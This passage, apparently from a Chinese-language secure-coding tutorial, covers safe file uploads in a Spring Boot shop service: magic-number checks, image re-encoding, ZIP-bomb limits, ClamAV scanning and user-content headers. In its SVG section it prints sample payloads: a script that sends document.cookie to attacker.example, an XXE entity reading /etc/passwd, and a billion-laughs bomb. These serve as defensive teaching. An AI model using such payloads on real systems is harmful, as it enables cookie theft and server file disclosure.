                // -1 = 通配（RIFF 的長度欄位）
                if (bytes[i] != -1 && (head[offset + i] & 0xFF) != bytes[i]) return false;
            }
            return true;
        }
    }

    /** 我們願意接受的型別 —— 白名單。 */
    public enum DetectedType {
        JPEG("image/jpeg", "jpg"),
        PNG ("image/png",  "png"),
        GIF ("image/gif",  "gif"),
        WEBP("image/webp", "webp"),
        PDF ("application/pdf", "pdf"),
        UNKNOWN(null, null);

        private final String mimeType;
        private final String extension;

        DetectedType(String mimeType, String extension) {
            this.mimeType = mimeType;
            this.extension = extension;
        }

        public String mimeType()  { return mimeType; }
        public String extension() { return extension; }
        public boolean isImage()  { return this == JPEG || this == PNG
                                        || this == GIF || this == WEBP; }
    }

    private static final List<Signature> SIGNATURES = List.of(
            new Signature(DetectedType.JPEG, 0, new int[]{0xFF, 0xD8, 0xFF}),
            new Signature(DetectedType.PNG,  0,
                    new int[]{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}),
            new Signature(DetectedType.GIF,  0,
                    new int[]{0x47, 0x49, 0x46, 0x38}),       // GIF8（87a / 89a 都吃）
            // RIFF????WEBP —— 中間 4 個 byte 是檔案長度，用 -1 通配
            new Signature(DetectedType.WEBP, 0,
                    new int[]{0x52, 0x49, 0x46, 0x46, -1, -1, -1, -1,
                              0x57, 0x45, 0x42, 0x50}),
            new Signature(DetectedType.PDF,  0,
                    new int[]{0x25, 0x50, 0x44, 0x46, 0x2D})
    );

    /**
     * 從已讀出的開頭位元組判定型別。
     *
     * @param head 至少 {@link #PROBE_BYTES} 個 byte（不足也可以，會回 UNKNOWN）
     */
    public static DetectedType detect(byte[] head) {
        if (head == null) return DetectedType.UNKNOWN;
        return SIGNATURES.stream()
                .filter(s -> s.matches(head))
                .map(Signature::type)
                .findFirst()
                .orElse(DetectedType.UNKNOWN);
    }

    /**
     * 從輸入流的開頭判定型別，<b>並保留已讀的位元組</b>。
     *
     * <p>⚠️ 這是 {@link InputStream} 的經典陷阱：
     * 讀了前 16 個 byte 之後，後面要儲存的人就少了 16 個 byte。
     * 解法是 {@code mark}/{@code reset}，但**不是每個 InputStream 都支援** ——
     * 所以這裡用 {@link java.io.PushbackInputStream} 明確地把讀過的推回去。
     *
     * @return 判定結果 + 一個「完整可讀」的新輸入流
     */
    public static Probe probe(InputStream in) throws IOException {
        java.io.PushbackInputStream pushback =
                new java.io.PushbackInputStream(in, PROBE_BYTES);
        byte[] head = new byte[PROBE_BYTES];
        int read = pushback.readNBytes(head, 0, PROBE_BYTES);
        if (read > 0) {
            pushback.unread(head, 0, read);          // ★ 推回去
        }
        byte[] actual = (read == PROBE_BYTES) ? head : Arrays.copyOf(head, Math.max(read, 0));
        return new Probe(detect(actual), actual, pushback);
    }

    /** @param stream 已還原到開頭的輸入流，可以直接交給儲存層 */
    public record Probe(DetectedType type, byte[] head, InputStream stream) {}

    /** 由宣告的 MIME 反查（只用來「比對是否一致」，不能單獨當判定依據）。 */
    public static Optional<DetectedType> fromMimeType(String mimeType) {
        if (mimeType == null) return Optional.empty();
        String normalized = mimeType.toLowerCase().split(";")[0].trim();
        return Arrays.stream(DetectedType.values())
                .filter(t -> normalized.equals(t.mimeType()))
                .findFirst();
    }

    private ContentTypeDetector() {}
}
```

⚠️ **magic number 只是「必要條件」，不是「充分條件」。**

一個 **polyglot 檔案**可以同時是合法的 JPEG 與合法的 ZIP：

```
FF D8 FF E0 ...（JPEG header 與資料）...
（JPEG 的 EOI 標記 FF D9）
50 4B 03 04 ...（一個完整的 ZIP，附在後面）...
```

JPEG 解析器看到 `FF D9` 就停了；ZIP 解析器**從檔案尾部**往前找 central directory，
所以它會找到那個 ZIP。**一個檔案在圖片檢視器裡是貓，在解壓縮軟體裡是 webshell。**

**這就是為什麼還需要 5.5.3 的二次編碼。**

### 5.5.3 圖片的二次編碼（re-encode）★

**核心想法：不要「驗證」使用者的圖片，而是「重畫」它。**

```java
package example.shop.common.upload;

import example.shop.common.error.ErrorCode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;

import javax.imageio.ImageIO;
import javax.imageio.ImageReader;
import javax.imageio.stream.ImageInputStream;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Iterator;

/**
 * 把上傳的圖片「重畫」一次。
 *
 * <p>★ 這是最強的內容防護，因為它不是「檢查有沒有壞東西」，
 * 而是<b>只保留像素，其餘全部丟掉</b>：
 * <ul>
 *   <li>附在 JPEG 後面的 ZIP（polyglot，5.5.2）→ 消失。</li>
 *   <li>EXIF 裡的 GPS 座標（<b>個資！</b>）、相機序號、縮圖 → 消失。</li>
 *   <li>PNG 的 {@code tEXt} / {@code iTXt} chunk 藏的 payload → 消失。</li>
 *   <li>SVG 裡的 {@code <script>} → 根本不會走到這裡（SVG 不在白名單）。</li>
 *   <li>畸形的 header（想觸發解析器漏洞）→ 在我們的解析器裡失敗，而不是在使用者的瀏覽器。</li>
 * </ul>
 *
 * <p>⚠️ 代價：
 * <ul>
 *   <li><b>CPU</b>：解碼 + 編碼一張 4000×3000 的 JPEG 約 150～400 ms。</li>
 *   <li><b>記憶體</b>：{@code BufferedImage} 是 <b>width × height × 4 bytes</b>，
 *       與檔案大小無關（5.5.4 的關鍵）。</li>
 *   <li><b>品質</b>：JPEG 是有損格式，重新編碼會再損失一次。所以品質參數不能設太低。</li>
 * </ul>
 */
@Component
public class ImageReencoder {

    private static final Logger log = LoggerFactory.getLogger(ImageReencoder.class);

    /**
     * 像素總數上限 ★
     *
     * <p>50 MP（例如 8660×5773）。這個數字的意義：
     * {@code 50_000_000 × 4 bytes = 200 MB} 的 {@code BufferedImage}。
     * 再乘上併發數就是你需要的 heap —— 所以這個值必須小，而且要有一個處理併發的閘門。
     */
    private static final long MAX_PIXELS = 50_000_000L;

    /** 單邊上限（防止 1×50000000 這種病態長條圖）。 */
    private static final int MAX_DIMENSION = 12_000;

    /**
     * 同時進行的解碼數量上限 ★
     *
     * <p>⚠️ 這個 semaphore 是必要的：沒有它，200 個併發上傳
     * 就是 200 × 200 MB 的 heap 需求。
     * 有了它，最壞情況是 4 × 200 MB = 800 MB —— 仍然大，
     * 所以 MAX_PIXELS 也不能放寬。
     */
    private final java.util.concurrent.Semaphore decodeSlots =
            new java.util.concurrent.Semaphore(4);

    /**
     * @return 重新編碼後的位元組（一律輸出 JPEG 或 PNG）
     * @throws ImageRejectedException 尺寸超限、無法解碼、或等待解碼名額逾時
     */
    public byte[] reencode(byte[] original, ContentTypeDetector.DetectedType type) {

        // ── 步驟 1：先讀「尺寸」而不解碼像素 ★★ ────────────────────
        // 這是防解壓縮炸彈的關鍵：ImageIO 可以只讀 header 拿到寬高，
        // 不必配置整張圖的記憶體。順序錯了（先 ImageIO.read）就已經 OOM 了。
        Dimensions dim = readDimensions(original);

        if (dim.width() > MAX_DIMENSION || dim.height() > MAX_DIMENSION) {
            throw new ImageRejectedException(
                    ErrorCode.PAYLOAD_TOO_LARGE,
                    "Image dimension %d×%d exceeds the %d px limit."
                            .formatted(dim.width(), dim.height(), MAX_DIMENSION),
                    java.util.Map.of("width", dim.width(), "height", dim.height(),
                                     "maxDimension", MAX_DIMENSION));
        }
        long pixels = (long) dim.width() * dim.height();
        if (pixels > MAX_PIXELS) {
            throw new ImageRejectedException(
                    ErrorCode.PAYLOAD_TOO_LARGE,
                    "Image has %d pixels, exceeding the %d limit."
                            .formatted(pixels, MAX_PIXELS),
                    java.util.Map.of("pixels", pixels, "maxPixels", MAX_PIXELS,
                                     "hint", "請將圖片縮小到 5000×5000 以內。"));
        }

        // ── 步驟 2：取得解碼名額 ────────────────────────────────────
        boolean acquired;
        try {
            acquired = decodeSlots.tryAcquire(2, java.util.concurrent.TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new ImageRejectedException(ErrorCode.SERVICE_UNAVAILABLE,
                    "Interrupted while waiting for a decode slot.", java.util.Map.of());
        }
        if (!acquired) {
            // ★ 回 503 + Retry-After 而不是排隊等下去 ——
            //   排隊會讓 Tomcat 的執行緒被佔滿（02-spring-boot 第 08 章）
            throw new ImageRejectedException(ErrorCode.SERVICE_UNAVAILABLE,
                    "Image processing is saturated.",
                    java.util.Map.of("retryAfterSeconds", 5));
        }

        // ── 步驟 3：真正解碼 + 重新編碼 ────────────────────────────
        try {
            BufferedImage decoded = ImageIO.read(new ByteArrayInputStream(original));
            if (decoded == null) {
                // ImageIO 找不到 reader（magic number 對但內容壞掉）
                throw new ImageRejectedException(ErrorCode.MALFORMED_REQUEST,
                        "The image could not be decoded.",
                        java.util.Map.of("hint", "檔案可能已損毀，請重新匯出後上傳。"));
            }

            String outputFormat = (type == ContentTypeDetector.DetectedType.PNG
                    || type == ContentTypeDetector.DetectedType.GIF) ? "png" : "jpg";

            // ★ 轉成沒有 alpha 的 RGB —— 否則 PNG 的透明區在 JPEG 會變成黑色
            BufferedImage canvas = new BufferedImage(
                    decoded.getWidth(), decoded.getHeight(),
                    "jpg".equals(outputFormat) ? BufferedImage.TYPE_INT_RGB
                                               : BufferedImage.TYPE_INT_ARGB);
            var g = canvas.createGraphics();
            try {
                if ("jpg".equals(outputFormat)) {
                    g.setColor(java.awt.Color.WHITE);        // 透明 → 白底
                    g.fillRect(0, 0, canvas.getWidth(), canvas.getHeight());
                }
                g.drawImage(decoded, 0, 0, null);
            } finally {
                g.dispose();                                 // ★ 一定要 dispose
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream(original.length);
            if (!writeJpegOrPng(canvas, outputFormat, out)) {
                throw new ImageRejectedException(ErrorCode.INTERNAL_ERROR,
                        "No writer for format " + outputFormat, java.util.Map.of());
            }
            byte[] result = out.toByteArray();

            log.debug("圖片重新編碼 {}×{} {} bytes → {} bytes format={}",
                      dim.width(), dim.height(), original.length, result.length, outputFormat);
            return result;

        } catch (IOException e) {
            throw new ImageRejectedException(ErrorCode.MALFORMED_REQUEST,
                    "Failed to process the image.",
                    java.util.Map.of("hint", "檔案可能已損毀。"));
        } catch (OutOfMemoryError e) {
            // ⚠️ 即使有 MAX_PIXELS，某些格式（大型 TIFF、動畫 GIF）仍可能爆
            //    catch OutOfMemoryError 一般是壞習慣，但這裡是刻意的：
            //    我們寧願回 413 也不要讓整個 JVM 死掉。
            log.error("圖片解碼 OOM {}×{}", dim.width(), dim.height());
            throw new ImageRejectedException(ErrorCode.PAYLOAD_TOO_LARGE,
                    "The image is too complex to process.", java.util.Map.of());
        } finally {
            decodeSlots.release();
        }
    }

    /** 只讀 header 取得尺寸，不配置像素緩衝區。 */
    private Dimensions readDimensions(byte[] bytes) {
        try (InputStream in = new ByteArrayInputStream(bytes);
             ImageInputStream iis = ImageIO.createImageInputStream(in)) {

            if (iis == null) {
                throw new ImageRejectedException(ErrorCode.MALFORMED_REQUEST,
                        "Unrecognised image stream.", java.util.Map.of());
            }
            Iterator<ImageReader> readers = ImageIO.getImageReaders(iis);
            if (!readers.hasNext()) {
                throw new ImageRejectedException(ErrorCode.UNSUPPORTED_MEDIA_TYPE,
                        "No decoder available for this image.", java.util.Map.of());
            }
            ImageReader reader = readers.next();
            try {
                reader.setInput(iis, true, true);
                // ★ getWidth/getHeight 只讀 header
                return new Dimensions(reader.getWidth(0), reader.getHeight(0));
            } finally {
                reader.dispose();
            }
        } catch (IOException e) {
            throw new ImageRejectedException(ErrorCode.MALFORMED_REQUEST,
                    "Failed to read image header.", java.util.Map.of());
        }
    }

    private boolean writeJpegOrPng(BufferedImage image, String format,
                                   ByteArrayOutputStream out) throws IOException {
        if ("jpg".equals(format)) {
            var writers = ImageIO.getImageWritersByFormatName("jpg");
            if (!writers.hasNext()) return false;
            var writer = writers.next();
            try (var ios = ImageIO.createImageOutputStream(out)) {
                writer.setOutput(ios);
                var param = writer.getDefaultWriteParam();
                param.setCompressionMode(javax.imageio.ImageWriteParam.MODE_EXPLICIT);
                // ★ 0.88 是實測的平衡點：肉眼幾乎看不出差異，檔案小約 35%
                //   設 0.7 以下商品圖會出現可見的色塊，電商不能接受
                param.setCompressionQuality(0.88f);
                writer.write(null, new javax.imageio.IIOImage(image, null, null), param);
            } finally {
                writer.dispose();
            }
            return true;
        }
        return ImageIO.write(image, format, out);
    }

    private record Dimensions(int width, int height) {}
}
```

```java
package example.shop.common.upload;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/** 圖片被拒絕。attach 的 ErrorCode 決定狀態碼（413 / 400 / 415 / 503）。 */
public class ImageRejectedException extends BusinessException {
    public ImageRejectedException(ErrorCode code, String detail,
                                  Map<String, Object> extensions) {
        super(code, detail, null, extensions, new Object[0], List.of());
    }
}
```

**「先讀尺寸再解碼」的順序有多重要 —— 一個實測**：

```java
// 用一個 1×1 的紅點做成 20000×20000 的 PNG（PNG 對單色區域壓縮率極高）
// 檔案大小：僅 41 KB
// 解碼後的 BufferedImage：20000 × 20000 × 4 = 1.6 GB

// 🔴 錯誤順序
BufferedImage img = ImageIO.read(in);      // ← 這一行就 OOM 了，還沒機會檢查

// ✅ 正確順序
Dimensions d = readDimensions(bytes);      // 讀 header，配置 0 bytes
if (d.width() * d.height() > MAX_PIXELS) throw ...;   // ← 在這裡就拒絕
BufferedImage img = ImageIO.read(in);      // 只有通過檢查的才解碼
```

⚠️ **`max-file-size: 10MB` 完全防不了這個攻擊**，因為檔案只有 41 KB。
**檔案大小與記憶體用量無關**，這是壓縮格式的本質。

### 5.5.4 ZIP bomb 與其他解壓縮炸彈

shop-service 有一個接受 ZIP 的端點：`POST /order-import-jobs`（批次匯入訂單）。

**經典的 ZIP bomb**：`42.zip` —— 42 KB 解開來是 4.5 PB（五層嵌套，每層 16 個檔案）。

```java
package example.shop.common.upload;

import example.shop.common.error.ErrorCode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

/**
 * 安全的 ZIP 解壓縮。
 *
 * <p>★ 四道防線，缺一不可：
 * <ol>
 *   <li><b>條目數上限</b> —— 防「一百萬個空檔案」。</li>
 *   <li><b>解壓縮後總大小上限</b> —— 防 42.zip。</li>
 *   <li><b>壓縮比上限</b> —— 提早偵測（不必等寫滿 1 GB 才知道）。</li>
 *   <li><b>路徑檢查</b> —— 防 Zip Slip（條目名稱含 {@code ../}）。</li>
 * </ol>
 *
 * <p>⚠️ 絕不能相信 {@link ZipEntry#getSize()}：那是 ZIP header 裡宣告的值，
 * 攻擊者可以寫任意數字。<b>只有「實際讀出來的位元組數」是真的。</b>
 */
public final class SafeZip {

    private static final Logger log = LoggerFactory.getLogger(SafeZip.class);

    private static final int MAX_ENTRIES = 1_000;
    private static final long MAX_TOTAL_UNCOMPRESSED = 200L * 1024 * 1024;   // 200 MB
    private static final long MAX_ENTRY_UNCOMPRESSED = 50L * 1024 * 1024;    // 50 MB
    private static final int MAX_COMPRESSION_RATIO = 200;
    private static final int BUFFER = 8192;

    /** 呼叫者對每個條目要做什麼。 */
    public interface EntryHandler {
        /** @param name 已驗證過的安全名稱；{@code in} 只在這個呼叫期間有效 */
        void handle(String name, InputStream in) throws IOException;
    }

    public static void forEachEntry(InputStream zipStream, EntryHandler handler)
            throws IOException {

        long totalUncompressed = 0;
        int entries = 0;

        try (ZipInputStream zis = new ZipInputStream(zipStream)) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {

                if (++entries > MAX_ENTRIES) {
                    throw reject("ZIP contains more than %d entries.".formatted(MAX_ENTRIES),
                            Map.of("maxEntries", MAX_ENTRIES));
                }

                // ── 防線 4：Zip Slip ────────────────────────────────
                String name = safeEntryName(entry.getName());
                if (entry.isDirectory()) {
                    zis.closeEntry();
                    continue;
                }

                // ── 防線 2、3：邊讀邊算 ★ ──────────────────────────
                long compressed = Math.max(entry.getCompressedSize(), 1);  // 可能是 -1
                CountingInputStream counting = new CountingInputStream(zis,
                        MAX_ENTRY_UNCOMPRESSED,
                        MAX_TOTAL_UNCOMPRESSED - totalUncompressed,
                        compressed, MAX_COMPRESSION_RATIO);

                handler.handle(name, counting);

                // ★ handler 可能沒讀完，我們要把剩下的讀掉才能算總量
                //   （也才能移到下一個 entry）
                counting.drain();

                totalUncompressed += counting.count();
                zis.closeEntry();
            }
        }
        log.debug("ZIP 解壓完成 entries={} uncompressed={}", entries, totalUncompressed);
    }

    /**
     * Zip Slip 防護。
     *
     * <p>條目名稱是攻擊者完全可控的字串，處理方式和 5.4 的檔名一樣：
     * <b>不做替換，只取最後一段。</b>
     */
    static String safeEntryName(String raw) {
        if (raw == null || raw.isBlank()) {
            throw reject("ZIP entry with empty name.", Map.of());
        }
        String name = SafeFilename.sanitize(raw, "dat");
        if (name.isBlank()) {
            throw reject("ZIP entry name became empty after sanitisation.",
                    Map.of("rawLength", raw.length()));
        }
        return name;
    }

    private static ImageRejectedException reject(String detail, Map<String, Object> ext) {
        return new ImageRejectedException(ErrorCode.PAYLOAD_TOO_LARGE, detail, ext);
    }

    /**
     * 邊讀邊檢查上限的包裝。
     *
     * <p>★ 關鍵設計：在 {@code read()} 裡檢查，而不是讀完再檢查 ——
     * 讀完再檢查等於已經把 4.5 PB 讀進來了。
     */
    static final class CountingInputStream extends InputStream {

        private final InputStream delegate;
        private final long maxEntry;
        private final long maxRemainingTotal;
        private final long compressedSize;
        private final int maxRatio;
        private long count;

        CountingInputStream(InputStream delegate, long maxEntry, long maxRemainingTotal,
                            long compressedSize, int maxRatio) {
            this.delegate = delegate;
            this.maxEntry = maxEntry;
            this.maxRemainingTotal = maxRemainingTotal;
            this.compressedSize = compressedSize;
            this.maxRatio = maxRatio;
        }

        @Override
        public int read() throws IOException {
            int b = delegate.read();
            if (b >= 0) checkAfterReading(1);
            return b;
        }

        @Override
        public int read(byte[] buf, int off, int len) throws IOException {
            int n = delegate.read(buf, off, len);
            if (n > 0) checkAfterReading(n);
            return n;
        }

        private void checkAfterReading(int n) {
            count += n;
            if (count > maxEntry) {
                throw reject("A ZIP entry exceeds the %d byte limit when decompressed."
                        .formatted(maxEntry), Map.of("maxEntryBytes", maxEntry));
            }
            if (count > maxRemainingTotal) {
                throw reject("The ZIP exceeds the total decompressed size limit.",
                        Map.of("maxTotalBytes", MAX_TOTAL_UNCOMPRESSED));
            }
            // ★ 壓縮比檢查：只在讀了足夠多之後才判斷（小檔案的比值沒有意義）
            if (count > 1024 * 1024 && count / compressedSize > maxRatio) {
                throw reject("Suspicious compression ratio %d:1 detected."
                                .formatted(count / compressedSize),
                        Map.of("maxRatio", maxRatio,
                               "hint", "檔案疑似為壓縮炸彈。"));
            }
        }

        void drain() throws IOException {
            byte[] scratch = new byte[BUFFER];
            while (read(scratch, 0, scratch.length) > 0) {
                // 繼續讀（檢查邏輯在 read 裡）
            }
        }

        long count() { return count; }

        /** ⚠️ 不要關閉底層的 ZipInputStream —— 還有下一個 entry 要讀。 */
        @Override
        public void close() { }
    }

    private SafeZip() {}
}
```

**「不要相信 `getSize()`」的實測**：

```java
// 用 hexedit 把 ZIP 的 local file header 裡的 uncompressed size 改成 100
ZipEntry entry = zis.getNextEntry();
System.out.println(entry.getSize());     // → 100      🔴 這是假的
// 實際讀出來
long actual = zis.readAllBytes().length; // → 4_500_000_000   ← 真相
```

**其他形式的解壓縮炸彈**：

| 類型 | 原理 | 防法 |
|---|---|---|
| ZIP bomb | 高壓縮比 + 嵌套 | 上面的四道防線 |
| **圖片炸彈** | PNG 對單色區域壓縮率極高（5.5.3） | 先讀 header 拿尺寸 |
| **XML 炸彈**（billion laughs） | 遞迴的 entity 定義 | 關閉 DTD（5.5.5） |
| **JSON 深度炸彈** | `[[[[[[…]]]]]]` 造成 stack overflow | Jackson 的 `StreamReadConstraints`（06 章 6.7.3） |
| **GZIP 炸彈**（`Content-Encoding: gzip` 的請求） | 同 ZIP，但在 HTTP 層 | ⚠️ Tomcat **不會**自動解壓縮請求 body，所以除非你自己加了解壓縮 filter，否則不受影響 |
| **正規表達式炸彈**（ReDoS） | 回溯爆炸 | 02 章 2.7.4 已處理 |

### 5.5.5 SVG：為什麼它不在白名單

**SVG 是 XML，而 XML 可以執行 JavaScript**：

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red"/>
  <script type="text/javascript">
    fetch('https://attacker.example/steal?c=' + document.cookie);
  </script>
</svg>
```

**這個檔案**：

| 情境 | 結果 |
|---|---|
| 用 `<img src="evil.svg">` 顯示 | ✅ 安全（`<img>` 裡的 SVG 不執行 script） |
| 使用者**直接開啟** `https://cdn.shop.example/evil.svg` | 🔴 **script 執行，而且是在 cdn.shop.example 這個 origin 上** |
| 用 `<object>` / `<embed>` / `<iframe>` 顯示 | 🔴 執行 |
| CSS `background-image: url(evil.svg)` | ✅ 安全 |

⚠️ **第二列是關鍵**：如果 CDN 網域與主站是同一個註冊域（`*.shop.example`），
那個 script 可以讀寫 `.shop.example` 的 cookie → **session 劫持**。

**SVG 的另外兩個問題**：

```xml
<!-- ① XXE：讀伺服器上的檔案 -->
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg><text>&xxe;</text></svg>

<!-- ② billion laughs：記憶體炸彈 -->
<!DOCTYPE svg [
  <!ENTITY a "aaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!-- …重複 9 層 → 10^9 個 'a' = 1 GB -->
]>
<svg><text>&i;</text></svg>
```

**shop-service 的決定：不接受 SVG。**

```java
    /** ★ SVG 刻意不在 DetectedType 裡 —— 見 5.5.5 的三個理由。 */
```

**如果你的產品必須接受 SVG**（例如品牌商標），三個要求同時滿足：

| 要求 | 做法 |
|---|---|
| 1. **清洗** | 用 [DOMPurify](https://github.com/cure53/DOMPurify)（Node）或 Java 的 `owasp-java-html-sanitizer` 白名單過濾標籤與屬性。⚠️ 自己寫 regex 一定會漏 |
| 2. **隔離 origin** | 放在**完全不同的註冊域**（`shop-usercontent.example`，不是 `cdn.shop.example`），這樣 script 執行也拿不到 cookie |
| 3. **強制下載而非顯示** | 回應加 `Content-Disposition: attachment` + `Content-Security-Policy: sandbox` + `X-Content-Type-Options: nosniff` |

**通用的「使用者上傳內容」回應標頭**（不只 SVG，所有上傳的檔案都該有）：

```java
package example.shop.common.upload;

import org.springframework.http.HttpHeaders;

/** 使用者上傳內容的回應標頭 —— 一組「假設內容是惡意的」的防護。 */
public final class UserContentHeaders {

    public static void apply(HttpHeaders headers) {
        // ★ 阻止瀏覽器「猜」內容型別。沒有這一行，一個宣告為 text/plain
        //   但內容是 HTML 的檔案會被 IE / 舊 Edge 當 HTML 執行。
        headers.add("X-Content-Type-Options", "nosniff");

        // ★ 即使檔案含 script，這個 CSP 也讓它什麼都做不了
        headers.add("Content-Security-Policy",
                "default-src 'none'; img-src 'self'; style-src 'unsafe-inline'; sandbox");

        // ★ 不要把 referrer（含 orderId 的 URL）洩漏給第三方
        headers.add("Referrer-Policy", "no-referrer");

        // 使用者內容不該被搜尋引擎索引
        headers.add("X-Robots-Tag", "noindex, nofollow");
    }

    private UserContentHeaders() {}
}
```

### 5.5.6 病毒掃描：介面設計

**要不要做？** 決策表：

| 情境 | 需要防毒掃描 |
|---|---|
| 只接受圖片，而且一律二次編碼（5.5.3） | ❌ 不需要（重畫已經摧毀了 payload） |
| 接受 PDF / Office 文件 | ✅ **需要** |
| 檔案會被**其他使用者**下載（例如客服看客戶上傳的收據） | ✅ **需要** |
| 檔案只被程式讀（CSV 匯入） | ⚠️ 不需要防毒，但需要格式驗證 |
| 有法規要求（金融、醫療） | ✅ 需要，而且要有掃描紀錄 |

**shop-service 的情境**：`POST /orders/{orderId}/receipts` 允許上傳 PDF，
而**客服會下載它** → 需要掃描。

```java
package example.shop.common.upload;

/**
 * 防毒掃描。
 *
 * <p>★ 抽成介面的三個理由：
 * <ol>
 *   <li>本機開發與測試不該需要一個 ClamAV 容器。</li>
 *   <li>雲端環境可能改用 S3 的 GuardDuty Malware Protection（掃描時機不同：
 *       物件上傳後非同步掃描，而不是同步阻擋）。</li>
 *   <li>掃描是**外部依賴** —— 它會逾時、會掛掉，
 *       所以呼叫端必須明確決定「掃描不可用時怎麼辦」（見下面的討論）。</li>
 * </ol>
 */
public interface MalwareScanner {

    /**
     * 掃描一段內容。
     *
     * @param content 完整的位元組（⚠️ 所以有大小上限 —— 見 {@link #maxScanBytes()}）
     * @param hint    給掃描器的檔名提示（不影響判定，只影響日誌可讀性）
     */
    ScanResult scan(byte[] content, String hint);

    /** 超過這個大小的內容不掃描（呼叫端要決定「不掃描的檔案怎麼處理」）。 */
    long maxScanBytes();

    /**
     * @param verdict 判定
     * @param signature 命中的病毒名稱（{@code INFECTED} 時才有值）
     * @param scannedAt 掃描時間（要存進稽核紀錄）
     */
    record ScanResult(Verdict verdict, String signature, java.time.Instant scannedAt) {

        public enum Verdict {
            CLEAN,
            INFECTED,
            /** ★ 掃描器不可用 / 逾時 / 檔案太大 —— 呼叫端必須明確處理這個狀態 */
            UNAVAILABLE
        }

        public static ScanResult clean() {
            return new ScanResult(Verdict.CLEAN, null, java.time.Instant.now());
        }
        public static ScanResult infected(String signature) {
            return new ScanResult(Verdict.INFECTED, signature, java.time.Instant.now());
        }
        public static ScanResult unavailable(String reason) {
            return new ScanResult(Verdict.UNAVAILABLE, reason, java.time.Instant.now());
        }
    }
}
```

**`UNAVAILABLE` 是這個介面最重要的設計**。fail-open 還是 fail-closed？

| 策略 | 行為 | 適用 |
|---|---|---|
| **fail-open** | 掃描不可用 → 接受檔案，標記為「未掃描」，事後補掃 | 上傳是核心流程，不能因為掃描器掛掉就整個停擺 |
| **fail-closed** | 掃描不可用 → 回 503 | 法規要求「必須掃描」 |
| **延後**（推薦）★ | 接受檔案，狀態設為 `PENDING_SCAN`，**下載端點拒絕未掃描的檔案** | 上傳不受影響，而風險轉移到下載（那裡可以等） |

**shop-service 選第三種**：

```java
    // 上傳時
    ScanResult result = scanner.scan(bytes, displayName);
    ReceiptScanStatus status = switch (result.verdict()) {
        case CLEAN       -> ReceiptScanStatus.CLEAN;
        case INFECTED    -> throw new MalwareDetectedException(result.signature());
        case UNAVAILABLE -> {
            // ★ 不擋上傳，但記下來讓補掃排程處理，並告警
            log.warn("防毒掃描不可用，收據標記為待掃描 reason={} traceId={}",
                     result.signature(), TraceContext.current());
            meterRegistry.counter("shop.malware.scan.unavailable").increment();
            yield ReceiptScanStatus.PENDING;
        }
    };
```

```java
    // 下載時（5.8.2）
    if (receipt.scanStatus() == ReceiptScanStatus.PENDING) {
        // ★ 回 202 而不是 404 或 503 —— 語意是「還沒好，稍後再來」
        throw new ReceiptScanPendingException(receipt.receiptId());
    }
```

**ClamAV 的實作**（用 INSTREAM 協定，不需要額外的 client 程式庫）：

```java
package example.shop.common.upload;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.stereotype.Component;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

/**
 * ClamAV 的 clamd INSTREAM 實作。
 *
 * <p>協定（純 TCP，非常簡單）：
 * <pre>
 *   →  "zINSTREAM\0"
 *   →  [4 bytes 長度][資料塊] × N
 *   →  [4 bytes 的 0]              ← 結束標記
 *   ←  "stream: OK\0"  或  "stream: Eicar-Test-Signature FOUND\0"
 * </pre>
 */
@Component
@ConditionalOnProperty(name = "api.upload.malware-scan.enabled", havingValue = "true")
public class ClamAvScanner implements MalwareScanner {

    private static final Logger log = LoggerFactory.getLogger(ClamAvScanner.class);

    private static final int CHUNK = 8192;

    private final String host;
    private final int port;
    private final int timeoutMs;
    private final long maxScanBytes;

    public ClamAvScanner(UploadProperties props) {
        var scan = props.malwareScan();
        this.host = scan.host();
        this.port = scan.port();
        this.timeoutMs = (int) scan.timeout().toMillis();
        this.maxScanBytes = scan.maxScanBytes().toBytes();
    }

    @Override
    public long maxScanBytes() { return maxScanBytes; }

    @Override
    public ScanResult scan(byte[] content, String hint) {
        if (content.length > maxScanBytes) {
            return ScanResult.unavailable("file-too-large-to-scan");
        }

        try (Socket socket = new Socket()) {
            // ★ 兩個 timeout 都要設：連線與讀取是不同的階段
            socket.connect(new InetSocketAddress(host, port), timeoutMs);
            socket.setSoTimeout(timeoutMs);

            try (DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                 InputStream in = socket.getInputStream()) {

                out.write("zINSTREAM\0".getBytes(StandardCharsets.US_ASCII));

                for (int offset = 0; offset < content.length; offset += CHUNK) {
                    int len = Math.min(CHUNK, content.length - offset);
                    out.writeInt(len);                    // 大端序的 4 bytes
                    out.write(content, offset, len);
                }
                out.writeInt(0);                          // 結束標記
                out.flush();

                String reply = new String(in.readAllBytes(), StandardCharsets.UTF_8).trim();
                return interpret(reply, hint);
            }
        } catch (IOException e) {
            // ★ 掃描器掛掉不是「檔案有病毒」，是 UNAVAILABLE
            log.warn("ClamAV 不可用 host={}:{} reason={}", host, port, e.getMessage());
            return ScanResult.unavailable("scanner-unreachable");
        }
    }

    private ScanResult interpret(String reply, String hint) {
        if (reply.endsWith("OK") && !reply.contains("FOUND")) {
            return ScanResult.clean();
        }
        if (reply.contains("FOUND")) {
            // "stream: Eicar-Test-Signature FOUND"
            String signature = reply.replace("stream:", "").replace("FOUND", "").trim();
